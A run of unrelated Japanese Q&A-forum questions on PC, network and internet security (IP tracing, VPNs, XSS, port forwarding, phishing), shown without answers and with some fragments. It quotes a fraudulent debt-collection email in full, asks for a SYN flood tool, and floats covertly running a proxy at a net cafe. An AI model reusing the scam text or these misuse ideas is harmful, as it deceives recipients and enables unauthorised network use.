中3です。 私はパソコンを1台持っているのですが、父親に使用制限をかけられています。 主に使用時間（一定時間を過ぎる、または夜9時を過ぎるとPCを使用できなくなる） 内容制限です。 ここまではいいのですが、（不本意ではありますが親の言い分も最もなので） なぜか5分おきにサインアウトされてしまいます。 これは親に聞いてもそんな設定していないと言われてしまうのですが、 なぜ5分おきにサインアウトされてしまうのでしょうか？ 教えてください。
元不倫相手のブログを一回アクセスしてしまいました。コメントはしていません、IPアドレスなど残ってしまいますか？
ユーザーのパソコンに直接不正侵入された場合と使用しているプロバイダーも変えろといわれるのはなぜですか。またプロバイダーではなくユーザーが使用しているサーバーに進入された場合、それを経由してその個人のパソコンを特定したり妨害したりできるのでしょうか。
入力しましたら、Google Chrome機能で、「パスワードを保存しますか？はい　いいえ」の 字幕がでてきましたので、「はい」をクリックしました。 セキュリテイー的にはよくないのでしょうか？ 心配なので、パスワードを保存しないように元に戻したいと思いますので、 その方法を教えていただけませんか。 PCはWindows8.1を使っています。 よろしくお願いいたします。
クライアントPCからWebサーバマシンに、httpにてポート８０番にアクセスします。 Webサーバからレスポンスは、クライアントのどのポートに送られてくるのですか。 なぜ、クライアントの受信ポートをファイアウォールで解放しなくてよいのでしょうか。
至急お願いします 携帯でサイトを見ようとすると 「あなたの端末はウイルスにかかっています」的なことを書かれてしまい、サイトにアクセスできません。 どうしようもないので、示されたところをタップすると、いっぱいアプリが並んでいる(ウイルスのやつ＋ゲーム)ところに飛んでしまいます。そこのウイルスのアプリはもうインストールしてます。 どうしたら良いでしょうか？ 分かりにくくてすみません。 何かあと1日以内にロックされますとか表示されることもあります。
このふーだいとゆうひとが上げてる暗号？はなにかわかりますか？
URLの ドメインとIPアドレスは対応付けられていて、 IPアドレスでもアクセスできると言われているので、実際、自分のサイトで確かめてみようと、サイトのIPアドレスを調べるために、　nslookupコマンドで詳細を表示すると、 権限のない回答: という形でアドレスが表示されます。　しかし、このアドレスでアクセスしても、サイトが表示されません。 権限がないので、やはり無理だということでしょうか?
raspberrypiにSSHでWAN側からアクセスしたいのですができません。 LAN側からのSSH接続には成功しました。 raspberrypi のOSはrasbianではなくOpenWrtといものを入れています。 SSHクライアントはteratermを使用しています。 rasberrypi側のプラベートIPアドレスはスタティックで固定しました。 ルータはBaffalo WHR-300を使用していて、baffalo airstation settingsでポート変換登録情報をInternet側IPアドレス=エアーステーションのInternet側IPアドレス、LAN側IPアドレス＝openwrtのプライベートIPアドレス、プロトコル・LAN側ポートをそれぞれSSH（２２）に設定し登録しました。 また、raspberrypi側のopenwrtでは　/etc/config/networkというファイルに config rule option name ' SSH' option src 'wan' option proto ' tcp' option dest_port '22' option target 'ACCEPT' という記述も追加しました。 以上の設定を行ったうえで、外部から接続するためにスマートフォンでデザリングしたPCからteratermを使って 外部PC（デザリング）→ルータ（Internet側IPアドレス）→raspberrypi で接続を試みるのですが、timeoutとなってしまいます。 それから試しに外部からではなく、 LAN内のPC→ルータ（Internet側IPアドレス）→rasberrypi で接続を試みるとconnection refusedとなります。 外部から接続できない原因が分からないので教えてほしいです。 ルータのbaffalo airstation settingsのページで確認できるInternet側のIPアドレスとhttps://www.cman.jp/network/support/go_access.cgiのサイトで確認できるグローバルIPアドレスが異なってしまっているのですがこれも関係あるのでしょうか？（どちらのIPアドレスも接続は失敗しました）
ネットで意味を調べると、ユーザからの入力をそのままWebページに表示するようなサイトで、スクリプトを入力することで、悪意のある動作をさせること、のような解説がされているんですが、 自分が持っているセスペの本では、上の行為は「スクリプティング」で、 「クロスサイトスクリプティング」は、攻撃者のサイトのスクリプトを踏ませて、それにより、上の「スクリプティング」を行わせることであると書いてあります。攻撃者のサイトと脆弱性のあるサイトをまたぐからクロスサイトであるとも書いてあります。 自分はずっと上の意味だと思っていたのですが、下の解説は納得できます。 どっちなんでしょうか？
システムエンジニアって不正アクセス出来るのですか？また、不正アクセスしたら自分がどうなるのか？(違法)のも心得ているのですか？
スイッチコントロールが突然使用できなくなりました。設定からスイッチコントロールをオンにしようとしても切り替わりません。どうしたらよいかわかりません。 回答をお願いしします
クライアントPCのIEのインターネットオプションにプロキシサーバの設定をすると、DNSの問い合わせもプロキシサーバが代理すると思いますが、もしそのプロキシサーバが障害で停止してしまった場合は、DNSの問い合わせはされないのでしょうか？ もしくはクライアントのIPアドレスの設定でしたDNSへ問い合わせに行くのでしょうか？
リモートデスクトップの接続で使用します。
中２の頃YouTubeにあげた動画を消したいのですがパスワードもメールアドレスも何もかも覚えてなくて 名前だけわかるので、変更を試みたのですが、昔のチャンネルと同じ名前入力しても入力した情報と一致しませんって表示されます。名前が逆なのかと何度も試みたのですがどうもできません。 この場合どうしたらいいですか？
以下を教えて下さい。 １．クリントンさんメールのハッキングがニュースになっていますが、私たちの個人メールも簡単にハッキングされるものでしょうか？ ２．ネットバンキングを利用してますが、ワンタイムパスワードを使っていますので勝手に引き出されたりしないように思います。大丈夫でしょうか？ ３．PCのアイコンの大きさが時々一回り大きくなります。ハッキングされるのでしょうか？セキュリティーソフトは使用してますが、たまに初期化した方が良いのでしょうか？
古いPSPで同人誌みたいなサイトを閲覧したら読んでるうちに違う同人誌のサイトに飛んでいました…。PSPはウイルスに感染しないって言われてるけどうちのは、古いバージョンで…。ワイハイ経由でPCにも感染することってあるのでしょうか。 一応クイックスキャンしたのですが異常は見られませんでした…。
今、海外のホテルに滞在しています。 PCと2台のスマートフォンがあり、そのうちPCだけがホテルのWi-Fiに接続できません。 以下環境(2),(3),のスマートフォンでは、Wi-Fiの設定でホテルのSSIDを選択したあと、ブラウザでどこかに接続しようとするとログイン画面が出て、ルーム番号と名前を入力してログインできます。 WEPキーなどは何も設定していません。 以下環境(1)のPCでは、 ホテルのSSIDを選択すると、右下にWi-Fiの電波のアイコンで！マークが付きます。 そのあと、ブラウザでwww.yahoo.co.jpに接続しようとすると以下メッセージが出てログイン画面までたどり着けません。 ・IE11の場合 　　「このページは表示できません 　　　Web アドレス http://www.guestservices.com:8880 が正しいか確かめてください。」 ・Chromeの場合 　　「このサイトにアクセスできません 　　www.guestservices.com からの応答時間が長すぎます」 ウィルスソフトなどは導入していません。 プロキシも設定していません。 コマンドプロンプトからipconfigで以下が返ってきます。 IPv4 アドレス . . . . . . . . . . : 10.10.3.168 サブネット マスク . . . . . . . . : 255.255.254.0 デフォルト ゲートウェイ . . . . . : 10.10.2.1 ping 10.10.2.1でタイムアウトになります。 このPCは自宅ではいつもWi-Fiに接続できています。 ■環境 (1), PC Lenovo ThinkPad X201s OS: fsWindows7(32bit) ブラウザ: IE11 ブラウザ: Chrome (2), スマートフォン1 Xperia Z3(※海外モデルのD6633） OS: Android6.0.1 (3), スマートフォン2 Google Nexus 5 OS: Android6.0.1
お世話になります。 ポイントサイトなどでよく見かけるネットアンケートがありますが、 大量のアンケートをプログラムなどで自動的に回答したり、 回答したように偽装することは可能なのでしょうか？ また、そのようなことが出来るツールなどがあるのでしょうか？ 実は運営しているサイトで広告アンケートを導入したのですが、 短時間で多数のアンケートに回答しているユーザーが増えており、 不正アクセスの可能性を探っている状況です。 詳しい方がおられればご教示の程お願い致します。
ＢからＡに公開鍵暗号方法で暗号文を送るとします。 最初にＡからＢに公開鍵を送ります。ある本によると公開鍵とは暗号法の一つだそうです。例えば 公開鍵は： ABC...をBCD...に一文字ずらす方法 すると平文を"IBM"とすると暗号文は"HAL"になります。 ＢはＡに"HAL"を送ります。 これを受け取ったＡは"HAL"を"IBM"に解読します。 悪意のあるＣが"HAL"を受信したとしても暗号法を知らないので"IBM"には戻すことが出来ない（もちろん、この例とした単純な暗号法では何時かは解読されますが）です。 この公開鍵暗号法を考えた人は賢いとは思いますが、公開するときにＣが公開鍵を見てしまったら意味がないのではないでしょうか。その本にはこの点が触れられていなかったのですが、素数が関係あると書かれていました。 どう関係あるのでしょうか。 難しい解説はご遠慮ください。
IPアドレスなど、直ぐにバレてしまうものでしょうか？悪口でもなんでもなく、元彼に匿名で伝えたいことがあります。 冷やかしはご遠慮ください
mcafeeのセキュリティソフトが8000円で自動更新され ２台目のパソコンをちょうど買ったため、その料金でスマホや新しいパソコンもマカフィーを入れれば、まあいっかと思っていたんですが ふとMcAfeeは重いとか不人気みたいな記事を今頃 目にしたんですが 今度のパソコンはライブ配信とかやったりする用のパソコンなんでできるだけ軽くしたいんですがセキュリティソフト？ウイルスソフト？がMcAfeeじゃ他のセキュリティソフトでやるときとでは劣りますか？ てかそもそもライブ配信関係なくパソコン玄人の人ってセキュリティソフトなに使ってるんですか？回答おねしゃす！！
スマホがもし遠隔操作されている場合調べる方法はありますか？又はウイルスソフトではそれはわからないのでしょうか？
ネットカフェいって ひそかにプロキシサーバたてるとか。
3つ質問しますが一つでもいいのでよろしくお願いします。 1 ゲオのWi-Fiを調べてみたらWPA2-PSKというセキュリティの方式らしいですが、セキュリティレベルはは良いほうですか？ 2.セブンイレブンなどのWi-Fiでのセキュリティなしはvpnというアプリを入れれば安全なのですか。 3.私は他人にバレないように自分にしか解らないように暗号化してパスワードをメモに保存してますが、ハッカーに侵入された場合、idやパスワードをスマホのGooglechromeなどのブラウザで登録してるのですが、そこでバレるようなことはありますか。 どうかご教示よろしくお願いします。
かにチャットというチャットでいつも会話をしています。 でも、他の人は毎日会っても「IPアドレス」が同じなのに自分のだけ 毎日変わります。なぜでしょうか？？ ※pcはいつもシャットダウンはしてません。コンセントも抜いてません。 　また、チャットでIPアドレスを固定していつも同じIPを使うにはどうすればいいでしょうか？
最近は至るところで画像が、出回っております。 そこで質問なのですが、 Google画像検索などで出てきた画像のアップロード元のIPアドレスを取得することは可能なのでしょうか？ 取得してどうこうではなく単純に可能かどうか、おしえてください。 またできればギミックなども詳しく教えてください。
これがあると、 サイトがほぼ見れません。 お客様サポート？を自分で解除したいです、 アクセス制限を解除したいです
パソコンについて質問です。 セキュリティーが万全の状態ではありませんという警告が出るのですが、どうすればいいですか？
右クリックをすると画像のようなものが出てきます。 わたしが何かをインストールしたと思うのですが、アプリの名前がわからずアンインストールできません。 いちいちこれが出て、煩わしいので この名前がわかる方、教えてください。
私見で結構ですので助言下さい。 ネットバンキング（住信SBI）での取引について、下記の安全対策をしておりますが万全でしょうか？ 1.ネット取引専用のPCを設けております（win10、カスペルスキ－、ウェブ閲覧やメ－ルチェック等多用途での使用禁止）。 2.ネット取引は数日に1回で30分以内です。使用後はシャットダウンでランケ－ブルを抜いてます。 3.パスワ－ドは住信SBIサイトで出てくるポップアップ？のキ－パッドを使用しております。 4.専用PC以外でのログインは一切無しで、PCも立ち上げ時にパスワ－ドをかけております（他の人間が使用できないように管理しております）。 5.パスワ－ドの管理が大変なため、定期的な変更はしておりません。 こんな管理で大丈夫かどうか、あと付け加えてこんな方法を取ると良いなどのご意見があればご教授下さい。 宜しくお願い致します。
現在mac(10.11.5)にてdropboxを使用しているのですが、PCを起動した直後に ”dropboxが最適に動作するために、ご使用のコンピュータのパスワードを入力してください” と表示され、PCのパスワードを求められます。 いつもこれを拒否しているのですが、今現在問題なく使えています。 これは何のためにパスワードを求められているのでしょうか？ このメッセージの表示を止める方法はパスワードを入力する以外にないのでしょうか？ よろしくお願いいたします。
パソコンのパスワードなどの重要な書類をUSBメモリーに保管して普段は取り外しておき、 使用する時だけ挿入するような使い方は出来ないのでしょうか、 此れだと怪しいメールを間違って開いても情報を盗まれないと思うのですが. USBメモリーは暗号化しておきそこでファイル名に暗号の一部を使用すれば (パスワードが(abcdefG1#25)として)ファイル名をbcdefG1#25とすれば先ずバスワードを忘れないと思います.
今晩は、宜しくお願い致します。 家庭内の同一のネットワークに繋がっているPC同士で、 Windows 10からWindows VISTA にアクセスしようとする と、エラーダイヤログが開き、 「\VAIO\Publicにアクセス出来ません。 このネットワークリソースを使用するアクセス許可がない 可能性があります。 アクセス許可があるかどうかこのサーバーの管理者に 問い合わせてください。 パラメーターが間違っています。」 と書いています。 以前、Windows 8.1からWindows 10にアップグレイド する前とか、Windows VISTA同士では、普通にアクセス 出来ます。 Windows 10にアップグレイドした後からこのような ダイヤログが出るようになりました。 一体何が原因でしょうか、原因が分かる方、宜しくお願い致します。
トランセンドのJetFrash350というUSBメモリを買いました。パスワードロックができるということなので、WEBページを見てパスワードロックを設定しようとしたのですが、うまくいきません。特定のフォルダにロックをかけた筈なのに、そのフォルダをクリックするとあっさり開けてデータも普通に出し入れできてしまいます。どうしたらよいのか教えていただけないでしょうか。よろしくお願いしますm(__)m 画像にあるように(画像が１枚しか貼れなかったので、分かりにくいとおもいますが)、手順に従ってしているつもりなのですが・・・ちなみにFドライブがUSBメモリで、その中に「F」というフォルダを作り、暗号化をかけてるのですが、Fフォルダが普通に開けてしまいます。
お世話になっております。 以下の症状について原因を調べる方法と対処方法を教えていただたく、 よろしくお願いします。 1.使用PC(2台) 1)デスクトップPC(東芝製)-Windows10 2)ノートpc(ACER製)-Windows7 2.通信環境 1)ひかりフレッツ(東日本） 2)無線LANルーター(ATERM)-アクセスポイントモード 3.やろうとしていること：VPN接続で自宅から会社のファイルサーバーにアクセス。 4.症状 1)Windows7のPC 　 VPN接続：OK 　 ファイルサーバーへのアクセス:;OK 2)Windows10のPC: ＶＰＮ接続：OK ファイルサーバーへのアクセス：不可（0x80004005のエラーメッセージ） 　(補足）10日ほど前まではWindows10でもアクセスできていたのですが、突然アクセス 　　　　できなくなりました。 5.対処したこと（以下の対処方法を行っても改善されませんでした） 1)Windows10の初期化（データファイルは残すモード） 2)ネットワークアダプターの確認（問題ありませんでした）。 6.教えていただきたいこと Window7ではアクセスできるのに、Windows10ではアクセスできない原因を調べる 方法と対処法を教えてください。 よろしくお願いします。
海外のイベントのチケットを取りたいのですが、電話番号を入力すると「フォーマットエラー」と表示されます。何が原因なのでしょうか。
IPアドレスは、インターネットに繋ぐ際の住所だと教え頂きました。 よくプログラムを開発する際、IPアドレスを適宜入れ替えるという話を聞きます。 これはどういう意味でしょうか？ 理由と、出来ればその方法を教えて頂きです（言語によって異なると思いますが、知っている言語で構いません）。 また、IPアドレスはインターネットに繋ぐ時の住所であるならば、サーバー型に設置してあるプログラムの住所元は、ずっと固定になるのでしょうか？ 質問があいまいですが、どうか詳しい説明をして頂けると助かります。
共有設定について教えていただきたいのです。 共有はだれが変更したか履歴のようなものは観れるのでしょうか？ 最終的にフォルダなどを変更した人を知りたいです (悪意のある変更などを監視したい)
最近仕事でSSLに関する勉強をしています。 SSLの勉強していてふと気付いたことだったのですが、 SSLを設定したサイトから、SSLを設定した別のサイトへのリダイレクト設定をするメリットってあるんでしょうか？ (イメージはこんな感じ：https://aaa.bbb.com → https://ccc.ddd.com) 社内で使っている旧サイトのURLにアクセスすると、新サイトにリダイレクトするようになっていたのですが、旧サイトと新サイトの両方にSSLが設定されていて、リダイレクト元のSSLは外しちゃってもいいんじゃないかと思いました。 当時の担当の方がもういないため、一体全体どうしてこうなってるのか誰も知らず、 外していいなら外してしまおうとなったのはいいとして、外すことで何か問題になることがあるのかどうか、という点で色々調べているのですが、なかなか見つからず困っている状態です。 専門的な知識の話となってしまってすみませんが、よろしくお願いいたします。
「ベリサイン」ってなんですか？
「アドオンを無効にすることで、閲覧の速度を上げます」とサイトの下に表示されることがあるのですが、アドオンとは何でしょうか。アドオンを無効にすることで、セキュリティとかなにか問題がおこったりしませんでしょうか。
はじめまして。 私は今、職場で自社ホームページの運営を兼任しているます。 そうは言っても、ホームページを作れる技術者ではなく、以前の担当が退職したため先月、私にその役割が回ってきました。 ホームページには、ワードプレスというシステムが導入されているそうで、管理画面に入っていろいろと調べたところ、本体とプラグインのアップデートアラートが沢山立っていました。 アップデートしないとセキュリティ上問題なのは理解しているのですが、よくセキュリティの問題で耳にするのが、クロスサイトスクリプティングや、SQLインジェクションです。 でも、この攻撃は、WEBサイト内にユーザーが入力できるフォームがある場合にされるのであって、入力フォームがない場合は問題ないと思うのですが、理解は正しいでしょうか？ もちろん、問い合わせフォームはありますが、これは外部のSalesforceの入力フォームを使用しています。 どなたかご教示いただけますと幸いです。 よろしくお願い致します。
セキュリティ対策ソフトの試験をしています。 実験に使えるsyn flood攻撃ツールをご存知であれば教えて頂けないでしょうか（違法性は無しで）。 以上、宜しくお願いします。
遠隔操作でＰＣの電源入れられるって 本当ですか？
最近低速の警告メールが来たのですが家でつかっていれば大丈夫なのでしょうか？教えてください！！
ネットを使った回線で固定電話番号に電話をかけたら、知らないうちに自動転送されていたケースがあったので、どういうルートで先方が自動転送したのか、ネットワークのメカニズムを知りたいのです。 自動転送されていたことは、フリーソフトの履歴で電話番号が違うのでハッキリわかっているのですが、どういう仕組みになっているのか、もっと詳しく分かるソフトが無いのか教えて頂きたいのです。
以前、よく生徒の個人情報を自宅PCのwinnyから流出させる問題がありました。自宅にデータを持ち帰ること自体にすでに問題があります。おまけにwinnyの使用と間が抜けていました。 最近、生徒が学校のサーバーに侵入するという事件がありました。といっても侵入方法は極簡単で、単に校内でのパスワードの漏えいらしいです。普通、生徒の前でパスワードを入力しますか？あり得ません。これでは防ぎようがないです。 セキュリティー管理の初歩の初歩である、PCの管理がずさんであったことが原因なのですがこういうことは、結局、学校側職員の認識の甘さが一番の問題なのではないでしょうか？ http://news.goo.ne.jp/topstories/nation/48/7dc5b …
仕事でブラウザベースのサービスを提供しているのですが、 クライアントに利用してもらうにあたり、ファイアウォールの 設定で一定のIPアドレスへのアクセスを許可してもらう必要が あります。 が、あるお客様からIPアドレスでの解放はできず、ドメイン名で 指定してほしい、と言われています。 そもそもファイアウォールの設定として、IPアドレス単位での アクセス許可ができない、ということがあるものでしょうか。 システム担当者が言うからそうなんだと思いますが、 それはどう言った理由によるものなんでしょうか？ 営業をしているのですが、当社のシステム担当と、クライアントの システム担当に挟まれて、答えに困っております。 どなたか、ご回答をお願いいたします。
お世話になります。何時も、YAHOOの検索エンジンを利用しているのですが、探しあてるまで、時間がかかります。もう少し、早く探すことが出来ないものでしょうか。宜しくお願いします。
AXIS M3004を使用してONVIFでのWAN越えの映像取得を試みてますが、 映像が取得できません。 ルータはYAMAHA NVR500を使用して、ポートフォワーディングをしてカメラにアクセスしています。 各ルーターのファイアウォール設定などはせず、全ての通信が可能な状況です。 また、使用しているPCのファイアウォール設定も無効にしています。 ONVIFユーザにはAdministrater権限のユーザを作成しています。 ONVIF Device Managerを使い映像を取得しようとすると、 映像以外の情報は取得できますが、LiveVideo及びVideoStreamingを選択して 映像を取得しようとしても映像は取得できません。 (NO SIGNALとでてしまう。) PCをカメラと同一ネットワークに接続して、プライベートアドレスで接続をした場合は 映像が見れます。 ONVIFでの映像取得にあたり、設定が必要な箇所を教えてください。
受信メールからIPアドレスがわかると聞きました。 そして、掲示板の管理人などは書き込み者のIPアドレスがわかりますよね 掲示板の荒らしがいたとしてIPアドレスが分かったとします その荒らしが自分の知人では？と思った場合、 その知人からのメールを調べ、出てくるIPアドレスが掲示板のほうのIPアドレスと一致する ということはあるのでしょうか？ それとも同一人物だったとしてもIPアドレスは変わるのでしょうか？ アドレスはdocomoのアドレスで、掲示板もdocomoのiPhoneからの書き込みだと仮定してください
JTBの顧客情報流出ですが、 アドレスは間違いなく、実在する航空会社のもの。しかし、事案の発覚後、メールの詳細が記されている「ヘッダー」を確認すると、実際はレンタルサーバーから送られてきたものとわかった。アドレスは、偽造されていた。 金子部長は「一目しただけでは判断できるものではなかった」と話す。オペレータは通常業務として、航空会社とメールでやり取りをしているという。 「知らないメールを開くな、というルールはありますが、これだけでそのオペレーターを責めるには、少し無理がある」 これに関して、 航空会社と航空会社の間では、 送信者と受信者の間で暗号通信を利用するようにしたら効果があるような気がしますが、 いかがでしょうか？ たとえば A社からB社へはAES暗号で鍵は123 B社からA社へはCamellia暗号で鍵は789 さらに、担当者ごとに 追加の多重暗号化の設定をする こんなシステムにすれば、 アドレスを偽ったり、それらしい内容を書いても 暗号化方式と暗号化鍵の情報がなければ、復号化の段階で自動的に 偽物だと判断できる。 このような方法には効果があるでしょうか？ 私は、少しは効果があると思っているのですが 皆様のお考えを聞かせてください。 よろしくお願いします。
社内のイントラネット（開発環境毎）にて自己CA局を立てています。 CNをIPアドレスの24bitのようなマスクをかけて作成する事って可能ですか？ 台数が多くなり、その都度作成するのが大変になってきたので 予めサブネット単位（FQDNでいう所のワイルドカード的な）で CNを設定する事が出来れば便利だなぁっと思ってます。 よろしくご教示下さい。
セキュリティ証明書の削除方法を教えて下さい。
【The cyber security companyの】「seccom global社」って日本のセコムと関係はありますか？ 日本のセコムはSECOMなのでCが1つ多いですが両方セコムですよね。 セコムってどういう意味なんでしょう。 英語の辞書にはないけどセコムって造語かな？ セキュリティ ドット コムを略してセコムにしたのかな？
最近は大手通販サイトなどでも情報流出があり、気になっています。 セキュリティを上手く切り抜けて、とか可能なものなのでしょうか・・。
お世話になります。 よく友人に頼まれ、チケットぴあやイープラスでチケットを取ります。 人気のチケットは発売開始に売り切れるほど接戦で、過去にはアイドルのライブのチケットでサーバーダウンもしているそうです。 このたび、教えていただきたいのは接続の仕組みです。 対策として、 ・nuroなど早い回線を利用する ・ガラケーからネットにつなぐ ・PCの処理能力を上げる などしているのですが、やはりうまく行きません。 出来るかどうかは別として、最善の状態にするために、ネットワークやプログラムに詳しい方ならどうされますか？ ネットワークの仕組みを理解して、友人に協力してみたいです。
VPNに接続してもインターネットに接続できない事態に陥ってしまいました。 原因を精査するべく、ネット検索をして解決策の糸口を探ろうと、 「コントロールパネル」→「ネットワークとインターネット」→「ネットワークと共有センター」→「ワイヤレスネットワーク接続の状態」→「ワイヤレスネットワーク接続のプロパティ」→「インターネットプロトコル バージョン4 (TCP/IPv4) のプロパティ」→「TCP/IP 詳細設定」 に行き着いたのですが、「リモートネットワークでデフォルトゲートウェイを使う」というチェックが無いのです。 この場合どうすれば、ネットワークが使用できるでしょうか。解決方法を教えてください。 OS ・Windows 7: Professional / Service Pack 1 VPN ・Super Hide IP ・Spotflux ・Safe IP ・Hotspot Shield
5GHzのWifi設置を検討しているのですが、DFSの影響を受けないW52 を是非選択したいところです。しかしながら設置場所が特殊です。 大規模な工場敷地内にいくつも存在する工場の１つに設置予定なの ですが当該工場は特殊で、大部分は屋根付きの屋内なのですが端に 行くと数mだけ屋根のないエリアがあります。 ここを屋外と扱うほかないのか、そもそもこの大規模工場敷地それ 自体が私有地であるから規制対象外なのか。 前例等あったらアドバイス頂けると幸いです。
初心者で申し訳ありません。 事務所で無線LANでネットワークをつくっています。 全ての機器にIPアドレスを固定したいとおもい 勉強している最中です。 そこで教えていただきたいのですが、たとえば ノートパソコンを192.168.1.100というIPアドレス を固定します。ところが、そのノートパソコンの 電源がOFFのあいだに、携帯でwifiにはいってきて 携帯が自動取得で192.168.1.100のIPを取得して しまう場合はないのでしょうか？ また、そうなってしまうのであれば、この番号は 自動取得させないという風に番号を空けておくことは できるのでしょうか？ 勉強不足で申し訳ないのですが、教えてください。 また、こういうことを勉強するといいという アドバイスもお願いいたします。
「コンピューターウィルス」と「マルウェア」は用語としてはどちらも有名ですが、 意味合いや脅威、その処理内容に差異はあるのでしょうか？。 すみません、教えて頂けますと助かります。
パソコンでホテルの予約などをしていると、画面下側に「Google comから967888854.jsを保存しますか？保存orキャンセル」の表示が出てきて煩わしいのですが、何の機能なのかを教えてください。 また、ブロックの仕方を教えて下さい。 ●該当サイトのブロックを試してみましたが、サイト自体にログイン出来なくなりました。 ●Cookieの削除は時々行なっております。 ●PCはWindows7 IE11です。
電話番号を追加すると、アカウントのセキュリティ保護などに役立ちます。 との宣伝文句が出ますが、 ネット上の情報を極力減らす方が安全だと思っているのです。 他のネット上の情報との紐付けがしやすくなると安全性は損なわれるとおもいます。 質問： フェイスブックで電話番号まで追加した方が安全性が強化されるのはなぜでしょうか？ よろしくお願いします。
・Windows 向け XAMPP v5.6.20 (PHP 5.6.20) ・BitnamiにてWordPress Module 4.5.2-0 Windows 環境は、 ・Windows 10 Home (64bit) ・ESET Smart Security 9 です。この状態で上記の WordPress Module 4.5.2-0 をインストールして、現在使っています。個人的な日記として使いたいので、外部から閲覧はされないか不安なのですが、その可能性はあるでしょうか？（ESET Smart Security 9 にはファイアーウォール機能も入っています） もし可能性があるのであれば、どのような対策を施せばいいでしょうか？どうぞご教示のほど、宜しくお願いいたします。
セキュリティ上、 優れたメール、メーラーを探しております。 例えば、フォーマルアタック対策が 施されているものです。 いくらパスワードを設定しても、 突破されては意味がないと存知ます。 不正アクセスがあれば、 ロック機能が働けば 安全だと存知ます。 上記内容につきまして お詳しい方 いらっしゃいましたら お教え頂ければ幸いでございます。 何卒、宜しくお願い申し上げます。
ハッキングされたかもしれません。 海外住です。インターネットバンキングでクレカと預金口座を管理しています。数時間前ですが、クレカのポイントが知らない間に消失してることに気づき,(MasterとVISA2枚とも)。クレカの会社(銀行です)に問い合わせたら、3月中旬にコンバートされてるとのこと。ですが、全く記憶にありません。 詳細を調べてもらってますが、これってハッキングですか？　私以外にパスワードやセキュリティコードを知る人間はいないし、そういったものはちゃんと管理しています。今のところ不審な送金はないようですが、不安でたまりません。 ネットバンキングのパスワードやセキュリティコードを変えようと思ってますが、一度ハッキングされたら防御の手立てはないのでしょうか？ 　 ご返信、よろしくお願い致します。
ネットやPC関係には、とても疎い時代遅れの40才（男）です。 アドセンスのアカウントを取得して ウェブサイト（シーサ―ブログ）のURLを入力したんですが ”URL にはパス（example.com/path）や サブドメイン（subdomain.example.com）を使用できません。詳細“ と赤い文字が出てきます… 詳細をクリックしても、さっぱり意味が分かりません… 何故、ウェブサイト（シーサ―ブログ）のURLを入力した時に このような赤い文字（説明）が出てくるんでしょうか？ PC等に弱い僕でも理解出来る回答をお願い致します！ ※因みに、説明してくださっても、それ自体が理解出来ない 　可能性もありますが、どうか宜しくお願い致します。
こんにちは。 最近snsなどのオンライン情報が知られない方法がよく書かれていますが、 私の場合、自宅のデスクトップのコンピューターで作業中、ある人にオンラインである事がわかっってしまいます。メールを開いたり、ネットにつなげたりなのか、pcを立ち上げた時なのか、わからないのですが、どうもわかってしまっているようです。相手の何かに表示されるようです。 pcはマックです。わからないように設定することは私のpc内で可能でしょうか。 相手には細かい事は聞いていません。 できるならば自分で設定してしまいたいと思います。 よろしくお願い致します。
早急に回答お願いします。 こんにちは。 昨日間違えてgoogle のクチコミでスターを乗せてしまったのですが、確認してみたら自分の本名も載っていてしまい１日かけて消そうと努力したのですが、google map にログインもできなくてかなり困っています。 その理由が、私のアカウントがgoogle mapを許可していないのことです。 どうやったら消せるのか詳しく教えていただけたらありがたいです。 よろしくお願いします
このようなメールが送られてきたのですが、ここの会社って本当にありますか？ 入会した覚えがないです ㈱データ通信管理 管理番号：G012062 【御通知】 御忙しい所失礼致します。 御客様のメール受信設定による御連絡の不着防止の為、弊社規定携帯端末からEメールによる通達を予め御了承下さい。 弊社は調査機関　㈱データ通信管理と申します。インターネットサイト『アクアブルー（管理会社㈱メディアカラー）』の利用状況に関して、サイト登録のまま放置状態とされています。 先方企業は、再三に亘る電子文書による通知状況を踏まえ、請求金額の徴収を困難とし、簡易裁判所に於ける法的解決を求められる段階で、弊社に身辺調査の依頼申請を提出されています。 身辺調査依頼の受託前に状況の再確認に御協力頂きたく御連絡させて頂きましたが、以下の点に関して再度御確認下さい。 ・誤操作による登録の可能性は無いか？ ・先方企業の通達を受信（確認）出来ていたか？ 民事訴訟規則において、訴状提出を控えた現状に於いても、先方企業の御理解の上で、簡潔な解決の手段は御座いますが、状況によって事案の対処、解決の方法は大きく異なって参ります。 御自身の状況の確認や、御相談の際は、冒頭の管理番号を把握して頂いた上、弊社まで御連絡下さい。 尚、本案件は翌営業日正午までの受付となります。予め御了承下さい。 ㈱データ通信管理 受付回線番号：03-5931-4471 受付時間 平日　10:00～19:00 土　10:00～17:00 日・祝　定休日
PCMechanicて詐欺なんですか？ また全額返金保障とあるけど返してもらえるんですか？
MacBook Proのウイルスセキュリティソフトのおすすめを知っている方教えて下さい！ "海外でも使えると嬉しいです。"
パソコンの環境にもよりますが、 一番ハッキングされやすいOSってあるのでしょうか？ そもそも、ハッキングされやすいとかではないんでしょうか？ 気になってしまって…夜も眠れません（笑）
最近、送り主のメールアドレスが私のメールアドレス、もちろん送信先も私のメールアドレスで下記のEMAILが届きました。 Envoyé de mon Galaxy S6 edge+ Orange タイにGALAXYを使ってる仲のいい友人がいて、同じ日にメールが届いたので うっかりZIPコード開こうと思いましたが、思いとどまりました。 確か、ORANGEを使ってたと思うので、本当にうっかり開けてしまいそうになりました。 検索すると、日本語では2件しかないようです。 ウイルスメールのようですが、私の何の情報が漏れたのでしょうか？ 総務省や警視庁に連絡するようにと、検索で引っかかったブログには書いてましたが 総務省や警視庁に通知して、何か解決するのでしょうか？
こんにちは、今日Gmailのログイン歴座みたいなのを見たらいつもとIPアドレスが違ってました。 ただ「外部からのアクセスはありません」となっておりました。 前のアドレスとooo.ooo.←までは一緒でそこからのooo.ooo.が変わってました。 念のためデバイスも見たところ自分が使ってるの以外はありませんでした。 これは乗っ取られてませんよね？そしてIPアドレスは変わるものなのでしょうか？ そして下には今使ってるIPアドレスはooo.ooo.ooo.ooo.（変わった後の番号）となってました。 安心していいですか？
前回下記の質問をしました。 https://oshiete.goo.ne.jp/qa/9240298.html IPアドレス検索。結果が異なるのはなぜ？ ある回答より aguseは管理者を表示するから101.102.128.0 - 101.102.255.255はすべてソフトバンクのある東京。IP広場は実際にそのIPアドレスを利用している場所だから全国ばらばら。 （引用終了） このお答えにはあるていど納得がいきましたが、まだ疑問が残ります。 というのは IPアドレス　101.102.241.192　をIPひろば　http://www.iphiroba.jp/　　で検索した結果は 「京都市」でしたが、実際にはこの端末を利用した際の現在地と異なっているのです。 なぜ現在地と違う場所が、「現在地である」との結果が出たのでしょうか？
